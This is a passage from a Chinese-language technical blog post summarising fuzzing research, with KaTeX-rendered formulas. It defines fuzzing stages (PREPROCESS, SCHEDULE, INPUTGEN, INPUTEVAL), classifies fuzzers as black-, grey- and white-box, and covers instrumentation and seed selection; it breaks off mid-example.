encoding="application/x-tex">\operatorname{PREPROCESS}(\mathbb{C}) \rightarrow \mathbb{C}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span class="mord mathrm">PREPROCESS</span></span><span class="mopen">(</span><span class="mord mathbb">C</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6889em;"></span><span class="mord mathbb">C</span></span></span></span></p><p>用户为<code>PREPROCESS</code>提供一组 fuzz 配置作为输入，它返回可能修改的 fuzz 配置集合。根据所使用的 fuzz 算法，<code>PREPROCESS</code>可能执行各种操作，例如向 PUT 插入监测代码或测量种子文件的执行速度。</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">SCHEDULE</mi><mo>⁡</mo><mrow><mo fence="true">(</mo><mi mathvariant="double-struck">C</mi><mo separator="true">,</mo><msub><mi>t</mi><mtext>elapsed</mtext></msub><mo separator="true">,</mo><msub><mi>t</mi><mtext>limit</mtext></msub><mo fence="true">)</mo></mrow><mo>→</mo><mi mathvariant="normal">conf</mi><mo>⁡</mo></mrow><annotation encoding="application/x-tex">\operatorname{SCHEDULE}\left(\mathbb{C}, t_{\text{elapsed}}, t_{\text{limit}}\right) \rightarrow \operatorname{conf}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mop"><span class="mord mathrm">SCHEDULE</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathbb">C</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">elapsed</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">limit</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mop"><span class="mord mathrm" style="margin-right:0.07778em;">conf</span></span></span></span></span></p><p><code>SCHEDULE</code>接受当前的 fuzz 配置集、当前已经过去的时间<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>t</mi><mrow><mi>e</mi><mi>l</mi><mi>a</mi><mi>p</mi><mi>s</mi><mi>e</mi><mi>d</mi></mrow></msub></mrow><annotation encoding="application/x-tex">t_{elapsed}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9012em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">se</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>和一个时间限制<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>t</mi><mrow><mi>l</mi><mi>i</mi><mi>m</mi><mi>i</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">t_{limit}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7651em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">imi</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>作为输入，并选择一个 fuzz 配置用于当前的 fuzz iteration。</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>INPUTGEN</mtext><mo stretchy="false">(</mo><mi mathvariant="normal">conf</mi><mo>⁡</mo><mo stretchy="false">)</mo><mo>→</mo><mtext>tcs</mtext></mrow><annotation encoding="application/x-tex">\text{INPUTGEN}(\operatorname{conf}) \rightarrow \text{tcs}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">INPUTGEN</span></span><span class="mopen">(</span><span class="mop"><span class="mord mathrm" style="margin-right:0.07778em;">conf</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord text"><span class="mord">tcs</span></span></span></span></span></p><p><code>INPUTGEN</code>接收一个 fuzz 配置作为输入，并返回一组具体的测试用例<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>c</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">tcs</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">cs</span></span></span></span>作为输出。在生成测试用例时，<code>INPUTGEN</code>使用<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>o</mi><mi>n</mi><mi>f</mi></mrow><annotation encoding="application/x-tex">conf</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">co</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span>中的特定参数。<strong>某些 fuzzer 使用<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>o</mi><mi>n</mi><mi>f</mi></mrow><annotation encoding="application/x-tex">conf</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">co</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span>中的种子生成测试用例，而其他 fuzzer 可能使用模型或语法作为参数。</strong></p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>INPUTEVAL</mtext><mrow><mo fence="true">(</mo><mi mathvariant="normal">conf</mi><mo>⁡</mo><mo separator="true">,</mo><mtext>tcs</mtext><mo separator="true">,</mo><msub><mi>O</mi><mtext>bug</mtext></msub><mo fence="true">)</mo></mrow><mo>→</mo><msup><mi mathvariant="double-struck">B</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo><mtext>execinfos</mtext></mrow><annotation encoding="application/x-tex">\text{INPUTEVAL}\left(\operatorname{conf}, \text{tcs}, O_{\text{bug}}\right) \rightarrow \mathbb{B}&#x27;, \text{execinfos}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord text"><span class="mord">INPUTEVAL</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mop"><span class="mord mathrm" style="margin-right:0.07778em;">conf</span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord text"><span class="mord">tcs</span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">bug</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9463em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathbb">B</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord text"><span class="mord">execinfos</span></span></span></span></span></p><p><code>INPUTEVAL</code>接收一个 fuzz 配置、一组测试用例<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>c</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">tcs</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">cs</span></span></span></span>和一个 bug oracle <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>O</mi><mrow><mi>b</mi><mi>u</mi><mi>g</mi></mrow></msub></mrow><annotation encoding="application/x-tex">O_{bug}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">ug</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>作为输入。它在<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>c</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">tcs</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">cs</span></span></span></span>上执行 PUT，并使用<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>O</mi><mrow><mi>b</mi><mi>u</mi><mi>g</mi></mrow></msub></mrow><annotation encoding="application/x-tex">O_{bug}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">ug</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>检查执行是否违反了正确性策略。</p></li></ul><p>这些定义和过程展示了 fuzzing 作为软件测试中的一个复杂且灵活的方法，它通过多种方式生成和评估测试用例，以检测和识别软件中的潜在错误和漏洞。</p><h2 id="Fuzzers-的分类">Fuzzers 的分类</h2><p>Fuzzers 可以根据在每次 fuzz 运行中所采用的语义粒度分为三类：黑盒、灰盒和白盒 fuzzers。</p><p><strong>黑盒 fuzzer</strong>是一种不涉及检查待测试程序（PUT）内部逻辑的技术。这种 fuzzer 仅仅关注 PUT 的输入和输出。在软件测试领域，黑盒测试也被称为 IO（输入/输出）驱动或数据驱动测试。然而，有些研究工作使用适应性策略来为黑盒 fuzzers 生成更有效的测试用例。</p><p>与黑盒 fuzzers 相对的是<strong>白盒 fuzzer</strong>，它通过分析 PUT 的内部结构和执行过程中收集的信息来生成测试用例。动态符号执行（Dynamic Symbolic Execution, DSE）是白盒 fuzzing 的一个例子，因为它通过具体的运行时状态替换一些符号值来执行测试。</p><p><strong>灰盒 fuzzer</strong>则采取了一种中间态度，它获取了 PUT 的部分内部信息和/或其执行过程中的信息。与白盒 fuzzers 不同，灰盒 fuzzers 不会深入推理 PUT 的全部语义；相反，它们可能会对 PUT 执行一些轻量级的静态分析，和/或收集关于其执行的动态信息，例如代码覆盖率。这种方法通常依赖于近似和不完全的信息，以此来提高速度，并能够测试更多的输入。</p><img src="http://cdn.blog-blockchain.xyz/202310171513386.png" alt="image-20231017150912387" style="zoom: 80%;" /><p>从 X 到 Y 的实线箭头表示 Y 引用、参考或以其他方式使用来自 X 的技术。</p><p><img src="http://cdn.blog-blockchain.xyz/202310171531164.png" alt="image-20231017153120080"></p><ol><li><strong>Fuzzer 类型（第 1 列）</strong>：标识 fuzzer 是黑盒（⬤）、白盒（◑）还是灰盒（○）。如果 fuzzer 在不同阶段采用不同类型的反馈机制，会显示两个圆圈，反映其混合方法。</li><li><strong>源代码公开性（第 2 列）</strong>：显示 fuzzer 的源代码是否公开，这有助于用户了解、修改和定制 fuzzer。</li><li><strong>源代码需求（第 3 列）</strong>：指示 fuzzer 是否需要访问 PUT 的源代码来进行测试，这影响了 fuzzer 的适用性和灵活性。</li><li><strong>内存中 Fuzzing（第 4 列）</strong>：表明 fuzzer 是否支持内存中 fuzzing，这种方式可以在不实际运行 PUT 的情况下进行测试，有助于提高效率。</li><li><strong>模型推断（第 5 列）</strong>：关于 fuzzer 是否能够推断出 PUT 的模型，这有助于生成更精确的测试用例。</li><li><strong>PREPROCESS 中的静态分析（第 6 列）</strong>：显示 fuzzer 在<code>PREPROCESS</code>阶段是否执行静态或动态分析，这影响了测试用例的生成和优化。</li><li><strong>多种子处理（第 7 列）</strong>：表示 fuzzer 是否支持处理多个种子并进行调度，这有助于提高测试用例的多样性。</li><li><strong>输入变异（第 8 列）</strong>：指定 fuzzer 是否执行输入变异来生成测试用例。◑ 表示 fuzzer 根据执行反馈来指导输入变异。</li><li><strong>基于模型的测试用例生成（第 9 列）</strong>：关于 fuzzer 是否基于模型生成测试用例，这可以提高测试的准确性和效率。</li><li><strong>符号分析（第 10 列）</strong>：显示 fuzzer 是否使用符号分析来生成测试用例，这有助于发现更深层次的漏洞。</li><li><strong>污点分析（第 11 列）</strong>：标识利用污点分析来指导测试用例生成的 fuzzer，这有助于识别潜在的安全漏洞。</li><li><strong>崩溃分类（第 12 和 13 列）</strong>：显示 fuzzer 是否使用堆栈哈希或代码覆盖率来执行崩溃分类，这对于识别和区分不同的崩溃类型很重要。</li><li><strong>种子池进化（第 14 列）</strong>：表示 fuzzer 在<code>CONFUPDATE</code>期间是否进化种子池，例如添加新种子，这有助于提高测试的广度和深度。</li><li><strong>在线学习输入模型（第 15 列）</strong>：关于 fuzzer 是否在线学习输入模型，这有助于动态调整和优化测试策略。</li><li><strong>移除种子（第 16 列）</strong>：显示哪些 fuzzer 会从种子池中移除种子，这有助于优化种子池，提高测试效率。</li></ol><p>另外，您可以在 <a href="https://fuzzing-survey.org/">fuzzing-survey</a> 上找到知识图谱。</p><h1>PREPROCESS</h1><p>在 fuzzing 的预处理阶段，某些 fuzzers 会通过修改初始 fuzz 配置集来准备主循环，作为首要步骤。预处理的目的通常是为了对待测试程序（PUT）进行插桩、去除可能冗余的配置、修剪种子，以及生成驱动应用程序。</p><h2 id="插桩">插桩</h2><p>不同于黑盒 fuzzers，灰盒和白盒 fuzzers 可以对 PUT 进行插桩，以便在 INPUTEVAL 阶段执行 fuzz 运行时收集执行反馈，或者在运行时 fuzz 内存中的内容。</p><p>程序插桩可以是静态的或动态的。静态插桩通常在 PUT 运行之前进行，比如在编译时对源代码或中间代码进行修改。由于静态插桩在运行时之前完成，通常比动态插桩带来的开销要小。动态插桩则在 PUT 运行时进行，能够轻松地对动态链接的库进行插桩。</p><p>插桩的具体实现可能包括：</p><ul><li><strong>执行反馈</strong>：例如，LibFuzzer 和 AFL 通过对每个分支指令进行插桩来计算分支覆盖率。</li><li><strong>线程调度</strong>：插桩还可以控制线程的调度，触发非确定性的程序行为，例如竞态条件错误。</li><li><strong>内存中模糊</strong>：通过在复杂的初始化之后对 PUT 进行快照，可以避免每次迭代都重新生成一个进程。新的测试用例可以通过恢复内存快照后直接写入内存来模糊。</li></ul><h2 id="种子选择与种子修剪">种子选择与种子修剪</h2><p>Fuzzers 接收一组控制 fuzzing 算法行为的配置。但某些参数可能有很大或甚至无限的域。种子选择问题涉及如何减少初始种子池的大小。</p><p>一个常见的方法，称为<strong>minset</strong>，找到一个最小的种子集，该种子集最大化了覆盖度指标，如节点覆盖度。例如，假设当前的配置集<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="double-struck">C</mi></mrow><annotation encoding="application/x-tex">\mathbb{C}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6889em;"></span><span class="mord mathbb">C</span></span></span></span>由两个种子<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">s_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">s_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>组成，它们覆盖 PUT 的以下地址：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">{</mo><msub><mi>s</mi><mn>1</mn></msub><mo>→</mo><mo stretchy="false">{</mo><mn>10</mn><mo separator="true">,</mo><mn>20</mn><mo stretchy="false">}</mo><mo separator="true">,</mo><msub><mi>s</mi><mn>2</mn></msub><mo>→</mo><mo stretchy="false">{</mo><mn>20</mn><mo separator="true">,</mo><mn>30</mn><mo stretchy="false">}</mo><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{ s_1\rightarrow \{ 10,20 \} ,s_2\rightarrow \{ 20,30 \} \}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">10</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">20</span><span class="mclose">}</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">20</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">30</span><span class="mclose">}}</span></span></span></span>。如果我们有第三个种子<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mn>3</mn></msub><mo>→</mo><mo stretchy="false">{</mo><mn>10</mn><mo separator="true">,</mo><mn>20</mn><mo separator="true">,</mo><mn>30</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">s_3\rightarrow \{ 10,20,30 \}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">10</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">20</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">30</span><span class="mclose">}</span></span></span></span>，执行速度大致与<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">s_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">s_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>相同，那么可以认为使用<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">s_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>进行模糊测试比使用<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">s_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">s_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>更有意义，因为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">s_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 